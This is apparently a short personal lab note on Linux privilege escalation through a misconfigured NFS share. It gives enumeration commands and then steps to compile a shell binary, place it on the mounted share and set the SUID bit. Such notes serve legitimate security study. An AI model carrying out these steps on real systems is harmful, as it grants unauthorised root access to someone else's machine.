- [ ] Enumeration of NFS Shares
- [ ] Exploitation

Enumeration of NFS Shares!!!
![[Pasted image 20251031125228.png]]
```sh
showmount -e 10.129.12.231
cat /etc/exports
```
Exploitation!!!!
```sh
gcc -s shell.c -o shell
mount -t nfs 10.129.2.12:/tmp /mnt/share
cp shell /mnt/share
chmod u+s /mnt/share/shell
```
References!!!
```
https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
```